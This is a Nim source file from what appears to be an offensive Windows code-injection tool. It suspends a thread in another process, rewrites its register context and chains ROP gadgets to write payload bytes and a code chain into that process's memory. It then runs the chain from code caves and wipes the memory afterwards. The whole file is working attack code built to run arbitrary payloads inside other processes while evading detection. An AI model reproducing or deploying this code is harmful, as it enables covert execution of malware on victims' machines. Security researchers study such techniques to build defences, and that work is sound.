#[
    Author: zimawhit3
    Github: https://github.com/zimawhit3
    License: BSD 3-Clause
]#
import winim/inc/[winbase, winuser] 
import winim/[winstr, utils] 
import json, strformat, strutils, tables
import typedefs, winapi, utility, memory, pe, hg, gadgets

export typedefs, winapi, utility, memory, pe, hg, gadgets, 
        json, strutils, winuser, winbase, winstr, utils, strformat

iterator subPayload*(Payload : seq[byte]) : int =
    let
        Iterations = Payload.len div int.sizeof
    var
        Index : int
    for i in 0 ..< Iterations:
        Index = i * int.sizeof
        yield cast[ptr int](Payload[Index].unsafeAddr)[]
    
func AddShadowSpace(StoreLocation : var seq[MemoryWrite], CurrentAddress : var int) =
    for i in 0 .. 3:
        let
            MemWrite : MemoryWrite = MemoryWrite(WriteWhat: 0, WriteWhere: CurrentAddress)
        StoreLocation.add(MemWrite)
        CurrentAddress += int.sizeof

func GetPayload*(Payloads : seq[Payload], PayloadLabel : string): Payload =
    result = nil
    for Payload in Payloads:
        if Payload.Label == PayloadLabel:
            result = Payload

func newPayload*(Label : string, Bytes : var seq[byte], StoreLocation : RWMemory, StoreOffset : int) : Payload =    
    Bytes.alignByteBoundary
    result = Payload(
        Label           : Label,
        Bytes           : Bytes,
        Size            : Bytes.len,
        StoreLocation   : StoreLocation,
        StoreOffset     : StoreOffset
    )

proc ParseCtxArg(Arg: JsonNode, Gadgets: seq[Gadget], Memorys: seq[RWMemory]): int {.raises: [KeyError].} =
    let
        ArgType : string    = Arg["Type"].getStr()
    
    case ArgType:
    of "Gadget":
        let
            GadgetLabel     : string    = Arg["Value"].getStr()
            GadgetOffset    : int       = Arg["Offset"].getInt()
            Gadgie          : Gadget    = Gadgets.GetGadgetByName(GadgetLabel)
        result = Gadgie.Address +% GadgetOffset
    of "Memory":
        let
            MemoryLabel     : string    = Arg["Value"].getStr()
            MemoryOffset    : int       = Arg["Offset"].getInt()
            MemoryBase      : int       = Memorys.getMemoryBaseAddress(MemoryLabel)
        result = MemoryBase +% MemoryOffset    
    of "Int":
        result = Arg["Value"].getInt()
    else:
        raise newException(KeyError, "[-] Invalid Type Key..")

proc ParseGadgetArg*(ProcessHandle: HANDLE, Memorys: seq[RWMemory], Gadgets: seq[Gadget], Payloads: seq[Payload], Functions: array[18, HGEntry], Arg : JsonNode) {.raises: [KeyError, OSError, ValueError].} =
    var
        ArgVal : int    
    let
        ArgType : string    = Arg["Type"].getStr()
        ArgLoc  : string    = Arg["Location"].getStr()
        ArgMem  : RWMemory  = getRWMemory(Memorys, ArgLoc)
        ArgPad  : int       = ArgMem.Padding
    
    case ArgType:
    of "CodeCave":
        var
            ModuleLabel : string = Arg["Value"].getStr()
            SectionLabel: string = Arg["Section"].getStr()
        ArgVal = ResolveCodeCaveAddress(ProcessHandle, ModuleLabel, SectionLabel, Functions)
        
    of "CodeCaveRVA":
        let
            ModuleLabel : string = Arg["Value"].getStr()
            SectionLabel: string = Arg["Section"].getStr()
        ArgVal = ResolveCodeCaveRVA(ModuleLabel, SectionLabel)
        
    of "DONTCARE":
        let
            NumSkips    : int = Arg["Value"].getInt()
        ArgMem.CurrentAddress = ArgMem.CurrentAddress +% (int.sizeof * NumSkips)
        return
    
    of "Function":
        var
            FunctionModule  : string = Arg["Module"].getStr()
            FunctionLabel   : string = Arg["Value"].getStr()
        ArgVal = ResolveFunction(ProcessHandle, FunctionModule, FunctionLabel, Functions)
        
    of "FunctionRVA":
        let
            FunctionModule  : string = Arg["Module"].getStr()
            FunctionLabel   : string = Arg["Value"].getStr()
        ArgVal = ResolveFunctionRVA(FunctionModule, FunctionLabel)
        
    of "Gadget":
        let
            GadgetLabel     : string    = Arg["Value"].getStr()
            Gadget          : Gadget    = Gadgets.GetGadgetByName(GadgetLabel)
            GadgetOffset    : int       = 
                if Arg.getOrDefault("GadgetOffset").isNil: 0
                else: Arg["GadgetOffset"].getInt()
        ArgVal = Gadget.Address +% GadgetOffset
        
    of "Int":
        let
            Value : int = Arg["Value"].getInt()
        ArgVal = Value

    of "Memory":
        let
            MemoryLabel     : string    = Arg["Value"].getStr()
            MemoryOffset    : int       = Arg["MemoryOffset"].getInt()
        var
            BaseAddress     : int       = Memorys.getMemoryBaseAddress(MemoryLabel)    
        ArgVal = BaseAddress +% MemoryOffset

    of "Module":
        let
            ModuleLabel : string = Arg["Value"].getStr()
        ArgVal = ResolveModuleBaseAddress(ProcessHandle, ModuleLabel, Functions)
        
    of "ModuleSize":
        let
            ModuleLabel : string = Arg["Value"].getStr()
        ArgVal = ResolveModuleSize(ModuleLabel)
        
    of "Payload":
        let
            PayloadLabel    : string    = Arg["Value"].getStr()
            Payload         : Payload   = GetPayload(Payloads, PayloadLabel)
        ArgVal = Payload.StoreLocation.BaseAddress +% Payload.StoreOffset
        
    of "PayloadSize":
        let
            PayloadLabel    : string    = Arg["Value"].getStr()
            Payload         : Payload   = Payloads.GetPayload(PayloadLabel)
        ArgVal = Payload.Size
        
    of "SHADOWSPACE":
        AddShadowSpace(ArgMem.WriteSequence, ArgMem.CurrentAddress)
        return

    else:
        raise newException(KeyError, "[-] Invalid Type Key..")
    
    let
        NewMemWrite : MemoryWrite   = MemoryWrite(WriteWhat: ArgVal, WriteWhere: ArgMem.CurrentAddress)
    ArgMem.WriteSequence.add(NewMemWrite)
    ArgMem.CurrentAddress = ArgMem.CurrentAddress +% (int.sizeof * ArgPad)
    
proc LoadGadget*(ProcessHandle: HANDLE, Gadgets: var seq[Gadget], Node: JsonNode, Functions: array[18, HGEntry]) {.raises: [KeyError, ValueError, OSError].} = 
    let
        Pattern         : seq[byte]     = Node["BytePattern"].getSeqByte()                
        GadgetModule    : string        = Node["GadgetModule"].getStr()
        Name            : string        = Node["Name"].getStr()
        Type            : GadgetType    = Node["GadgetType"].getGadgetType()
        Volatile        : bool          = Node["Volatile"].getBool(true)
        GadgetOff       : int           =
            if Node.getOrDefault("ModuleOffset").isNil: 0
            else: Node["ModuleOffset"].getInt()
    
    if Type == GadgetType.MainStore:
        let
            DestinationReg  : Register      = Node["DestinationRegister"].getRegister()
            SourceReg       : Register      = Node["SourceRegister"].getRegister()
        if GadgetOff != 0:
            var
                ModuleBaseAddress : int = ResolveModuleBaseAddress(ProcessHandle, GadgetModule, Functions)
            let
                Address     : int       = ModuleBaseAddress +% GadgetOff
                NewGadget   : Gadget    = newGadget(Pattern, Type, GadgetModule, Name, Volatile, SourceReg, DestinationReg, Address)
            Gadgets.add(NewGadget)
        else:
            let            
                NewGadget : Gadget = newGadget(Pattern, Type, GadgetModule, Name, Volatile, SourceReg, DestinationReg)
            Gadgets.add(NewGadget)
    else:
        let
            DestinationReg  : Register      = 
                if Node.getOrDefault("DestinationRegister").isNil: Register.REL
                else: Node["DestinationRegister"].getRegister()
            SourceReg       : Register      = 
                if Node.getOrDefault("SourceRegister").isNil: Register.REL
                else: Node["SourceRegister"].getRegister()
        if GadgetOff != 0:
            var
                ModuleBaseAddress : int = ResolveModuleBaseAddress(ProcessHandle, GadgetModule, Functions)
            let
                Address     : int       = ModuleBaseAddress +% GadgetOff
                NewGadget   : Gadget    = newGadget(Pattern, Type, GadgetModule, Name, Volatile, SourceReg, DestinationReg, Address)
            Gadgets.add(NewGadget)
        else:
            let            
                NewGadget : Gadget = newGadget(Pattern, Type, GadgetModule, Name, Volatile, SourceReg, DestinationReg)
            Gadgets.add(NewGadget)
    
func LoadMemory*(Memorys: var seq[RWMemory], Node : JsonNode) {.raises: [KeyError].} =
    let
        Label       : string            = Node["Label"].getStr()
        BaseAddress : int               = Node["BaseAddress"].getInt()
        Size        : int               = Node["Size"].getInt()
        Padding     : int               = Node["Padding"].getInt()
        MemSeq      : seq[MemoryWrite]  = newSeq[MemoryWrite]()
        NewMemory   : RWMemory          = newRWMemory(Label, MemSeq, BaseAddress, BaseAddress, Size, Padding)
    Memorys.add(NewMemory)

proc LoadPayload*(Payloads: var seq[Payload], Memorys: seq[RWMemory], Node: JsonNode) {.raises: [KeyError, ValueError].} =
    var
        Bytes       : seq[byte] = Node["Bytes"].getSeqByte()
    let
        Label       : string    = Node["Label"].getStr()
        Location    : string    = Node["StoreLocation"].getStr()
        StoreOffset : int       = Node["StoreOffset"].getInt()
        StoreLoc    : RWMemory  = getRWMemory(Memorys, Location)
        NewPayload  : Payload   = newPayload(Label, Bytes, StoreLoc, StoreOffset)
    Payloads.add(NewPayload)

proc LoadStartContext*(StartCtx: PCONTEXT, TargetRip: var DWORD64, Gadgets: seq[Gadget], Memorys: seq[RWMemory], Nodes: JsonNode) {.raises: [KeyError, ValueError].} =
    for Node in Nodes.keys():
        let
            ArgVal : int = ParseCtxArg(Nodes[Node], Gadgets, Memorys)
        if Node == "Target":
            TargetRip = ArgVal
        else:
            setContext(Node, ArgVal, StartCtx)

proc InitializeClientID*(ProcessHandle, ThreadHandle: int16, Clid: PCLIENT_ID, WindowObj: ptr WindowObject, Functions: array[18, HGEntry]): bool =
    if not getClientID(ProcessHandle, ThreadHandle, Clid, Functions):
        result = false
        return

    WindowObj.ThreadID = Clid.UniqueThread.int32
    if not GetWindowHandle(WindowObj):
        result = false
    else:
        result = true

proc InitializeHandles*(ProcessHandle, ThreadHandle: PHANDLE, Clid: PCLIENT_ID, Functions: array[18, HGEntry]): bool =

    result = true

    if not GetProcessHandle(ProcessHandle, Clid, Functions):
        result = false
        return

    if not GetThreadHandle(ThreadHandle, Clid, Functions):
        result = false
        return
    
proc InitializeContexts*(ThreadHandle: HANDLE, SaveCtx, ExeCtx, StartCtx: PCONTEXT, Functions: array[18, HGEntry]): bool =

    result = true

    if not SuspendThread(ThreadHandle, Functions):
        result = false
        return
    
    if not GetContext(ThreadHandle, SaveCtx, Functions):
        result = false
        return

    if not ResumeThread(ThreadHandle, Functions):
        result = false
        return

    ExeCtx[].deepCopy(SaveCtx[])
    StartCtx[].deepCopy(SaveCtx[])
    
func InitializeWriteGadget*(WriteGadget: Gadget, ExeCtx: PCONTEXT) =
    var
        ContextTable : Table[Register, ptr int] = {
            Register.RIP : cast[ptr int](ExeCtx.Rip.unsafeAddr()),
            Register.RSP : cast[ptr int](ExeCtx.Rsp.unsafeAddr()),
            Register.RBP : cast[ptr int](ExeCtx.Rbp.unsafeAddr()),
            Register.RAX : cast[ptr int](ExeCtx.Rax.unsafeAddr()),
            Register.RBX : cast[ptr int](ExeCtx.Rbx.unsafeAddr()),
            Register.RCX : cast[ptr int](ExeCtx.Rcx.unsafeAddr()),
            Register.RDX : cast[ptr int](ExeCtx.Rdx.unsafeAddr()),
            Register.R8  : cast[ptr int](ExeCtx.R8.unsafeAddr()),
            Register.R9  : cast[ptr int](ExeCtx.R9.unsafeAddr()),
            Register.R10 : cast[ptr int](ExeCtx.R10.unsafeAddr()),
            Register.R11 : cast[ptr int](ExeCtx.R11.unsafeAddr()),
            Register.R12 : cast[ptr int](ExeCtx.R12.unsafeAddr()),
            Register.R13 : cast[ptr int](ExeCtx.R13.unsafeAddr()),
            Register.R14 : cast[ptr int](ExeCtx.R14.unsafeAddr()),
            Register.R15 : cast[ptr int](ExeCtx.R15.unsafeAddr()),
            Register.RDI : cast[ptr int](ExeCtx.Rdi.unsafeAddr()),
            Register.RSI : cast[ptr int](ExeCtx.Rsi.unsafeAddr())
        }.toTable
    WriteGadget.DestinationAddress  = ContextTable[WriteGadget.DestinationRegister]
    WriteGadget.SourceAddress       = ContextTable[WriteGadget.SourceRegister]

proc InitializeStack*(ProcessHandle, ThreadHandle: HANDLE, ExeCtx: PCONTEXT, Memorys: var seq[RWMemory], Functions: array[18, HGEntry]) : bool =
    var
        BaseAddress             : PVOID
        Size, CurrentAddress    : int
    
    result = true
    if not EnumThreadStack(ProcessHandle, ThreadHandle, BaseAddress, Functions):
        result = false
        return
    if ExeCtx.Rsp == 0:
        result = false
        return
    
    Size = ExeCtx.Rsp.int -% cast[int](BaseAddress)
    CurrentAddress = cast[int](BaseAddress) + int.sizeof

    let
        MemSeq      : seq[MemoryWrite]  = newSeq[MemoryWrite]()
        NewMemory   : RWMemory          = newRWMemory("Stack", MemSeq, cast[int](BaseAddress), CurrentAddress, Size, 1)
    Memorys.add(NewMemory)
    
func InitializePayloads*(Payloads: seq[Payload]) =   
    for Payload in Payloads:
        let
            MemorySection   : RWMemory          = Payload.StoreLocation
            MemoryOffset    : int               = Payload.StoreOffset
            ByteSequence    : seq[byte]         = Payload.Bytes

            BaseAddress     : int               = MemorySection.BaseAddress
            Padding         : int               = MemorySection.Padding
        var
            WriteSeq        : seq[MemoryWrite]  = MemorySection.WriteSequence
            WriteAddress    : int               = BaseAddress +% MemoryOffset
        
        for Byte8 in ByteSequence.subPayload():
            let
                MemWrite : MemoryWrite = MemoryWrite(WriteWhere: WriteAddress, WriteWhat: Byte8)
            WriteSeq.add(MemWrite)
            WriteAddress = WriteAddress +% (int.sizeof * Padding)

proc SetThreadLock(ThreadHandle: HANDLE, ExeCtx: PCONTEXT, WinHandle: HWND, Functions: array[18, HGEntry]): bool =
    var
        tmpContext : CONTEXT = CONTEXT(ContextFlags: CONTEXT_ALL)

    result = true

    if not GetContext(ThreadHandle, &tmpContext, Functions):
        result = false
        return

    if not SetContext(ThreadHandle, ExeCtx, Functions):
        result = false
        return
    
    if not winimConverterBOOLToBoolean(PostMessage(WinHandle, WM_COMMAND, 0, 0)):
        result = false
        return

    while tmpContext.Rip != ExeCtx.Rip:

        if not ResumeThread(ThreadHandle, Functions):
            result = false
            return
        
        Sleep(0)

        if not SuspendThread(ThreadHandle, Functions):
            result = false
            return
        
        if not GetContext(ThreadHandle, &tmpContext, Functions):
            result = false
            return
    
    if not GetContext(ThreadHandle, ExeCtx, Functions):
        result = false
        return

proc WaitThreadLock(ThreadHandle: HANDLE, TargetRip: DWORD64, ExeCtx: PCONTEXT, Functions: array[18, HGEntry]): bool =
    var
        tmpContext : CONTEXT = CONTEXT(ContextFlags: CONTEXT_ALL)
    
    result = true

    if not SetContext(ThreadHandle, ExeCtx, Functions):
        result = false
        return

    if not GetContext(ThreadHandle, &tmpContext, Functions):
        result = false
        return

    while tmpContext.Rip != TargetRip:
        
        if not ResumeThread(ThreadHandle, Functions):
            result = false
            return
        
        Sleep(0)

        if not SuspendThread(ThreadHandle, Functions):
            result = false
            return
        
        if not GetContext(ThreadHandle, &tmpContext, Functions):
            result = false
            return
    
    if not GetContext(ThreadHandle, ExeCtx, Functions):
        result = false
        return

proc WriteThread(ThreadHandle: HANDLE, Gadgets: seq[Gadget], Memorys: seq[RWMemory], ExeCtx: PCONTEXT, Writewhat, Writewhere: int, Functions: array[18, HGEntry]): bool =
    let
        WriteGadget     : Gadget    = Gadgets.GetMainStore
        WriteAddress    : int       = WriteGadget.Address
        StackBase       : int       = Memorys.getMemoryBaseAddress("Stack")
        TargetRIP       : DWORD64   = Gadgets.GetSink.Address.DWORD64

    ExeCtx.Rip = WriteAddress.DWORD64
    ExeCtx.Rsp = StackBase.DWORD64
    WriteGadget.DestinationAddress[] = Writewhere
    WriteGadget.SourceAddress[] = Writewhat

    when not defined(zima):
        yellow(fmt"[i] Writing {Writewhat.toHex} to {Writewhere.toHex}")

    if not WaitThreadLock(ThreadHandle, TargetRIP, ExeCtx, Functions):
        result = false
    else:
        result = true
    
proc SinkThread*(ThreadHandle: HANDLE, ExeCtx: PCONTEXT, SinkAddr: DWORD64, WindowObj: WindowObject, Functions: array[18, HGEntry]): bool =
    ExeCtx.Rip = SinkAddr
    if not SetThreadLock(ThreadHandle, ExeCtx, WindowObj.WindowHandle, Functions):
        when not defined(zima):
            red("[!] Failed to Sink Thread")
        result = false
    else:
        when not defined(zima):
            green("[+] Successfully Sunk Thread")
        result = true

proc WriteMemory*(ThreadHandle: HANDLE, Gadgets: seq[Gadget], Memorys: seq[RWMemory], Payloads: seq[Payload], ExeCtx: PCONTEXT, Functions: array[18, HGEntry]): bool =
    
    result = true
    when not defined(zima):
        yellow(fmt"[i] Writing Payloads...")
    for Payload in Payloads:
        let
            ByteSeq         : seq[byte] = Payload.Bytes
        var
            StoreLocAddr    : int       = Payload.StoreLocation.BaseAddress +% Payload.StoreOffset
        for Bytes in ByteSeq.subPayload():
            if not WriteThread(ThreadHandle, Gadgets, Memorys, ExeCtx, Bytes, StoreLocAddr, Functions):
                result = false
                return
            StoreLocAddr = StoreLocAddr +% int.sizeof
    
    when not defined(zima):
        yellow(fmt"[i] Writing Code Chain...")
    for WriteSequence in Memorys.WriteSeqs:
        for MemWrite in WriteSequence:
            if not WriteThread(ThreadHandle, Gadgets, Memorys, ExeCtx, MemWrite.WriteWhat, MemWrite.WriteWhere, Functions):
                result = false
                return
    
proc WriteSink*(ThreadHandle: HANDLE, Gadgets: seq[Gadget], Memorys: seq[RWMemory], ExeCtx: PCONTEXT, Functions: array[18, HGEntry]): bool =
    let
        SinkAddress : int       = Gadgets.GetSink.Address
        StackBase   : int       = Memorys.getMemoryBaseAddress("Stack")
    when not defined(zima):
        yellow(fmt"[i] Writing Sink to Stack Base")
    if not WriteThread(ThreadHandle, Gadgets, Memorys, ExeCtx, SinkAddress, StackBase, Functions):
        result = false
    else:
        result = true

proc CleanMemory*(ThreadHandle: HANDLE, Gadgets: seq[Gadget], Memorys: seq[RWMemory], Payloads: seq[Payload], ExeCtx: PCONTEXT, Functions: array[18, HGEntry]): bool =
    # Note: Doesn't remove the sink gadget from the Stack Base. As well as DONTCARE's that were overwritten later in the Chain
    result = true
    when not defined(zima):
        yellow(fmt"[i] Cleaning Memory...")
    let
        StackBase = Memorys.getRWMemory("Stack").BaseAddress
    for Payload in Payloads:
        let
            ByteSeq         : seq[byte] = Payload.Bytes
        var
            StoreLocAddr    : int       = Payload.StoreLocation.BaseAddress +% Payload.StoreOffset
        for Bytes in ByteSeq.subPayload():
            if not WriteThread(ThreadHandle, Gadgets, Memorys, ExeCtx, 0, StoreLocAddr, Functions):
                result = false
                return
            StoreLocAddr = StoreLocAddr +% int.sizeof
    for WriteSequence in Memorys.WriteSeqs:
        for MemWrite in WriteSequence:
            
            if MemWrite.WriteWhere == StackBase:
                continue

            if not WriteThread(ThreadHandle, Gadgets, Memorys, ExeCtx, 0, MemWrite.WriteWhere, Functions):
                result = false
                return

proc ResumeExecution*(ThreadHandle: HANDLE, SaveCtx: PCONTEXT, Functions: array[18, HGEntry]): bool =
    result = true
    if not SetContext(ThreadHandle, SaveCtx, Functions):
        result = false
        return
    if not ResumeThread(ThreadHandle, Functions):
        result = false
        return
    
proc ExecuteCodeChain*(ThreadHandle: HANDLE, TargetRip: DWORD64, StartCtx: PCONTEXT, Functions: array[18, HGEntry]): bool =
    
    when not defined(zima):
        yellow(fmt"[i] Executing Code Chain...")
    if not WaitThreadLock(ThreadHandle, TargetRip, StartCtx, Functions):
        result = false
    else:
        result = true

proc Exit*(ProcessHandle, ThreadHandle: HANDLE, SaveCtx: PCONTEXT, Functions: array[18, HGEntry]) =
    discard ResumeExecution(ThreadHandle, SaveCtx, Functions)
    CloseHandle(ThreadHandle)
    CloseHandle(ProcessHandle)
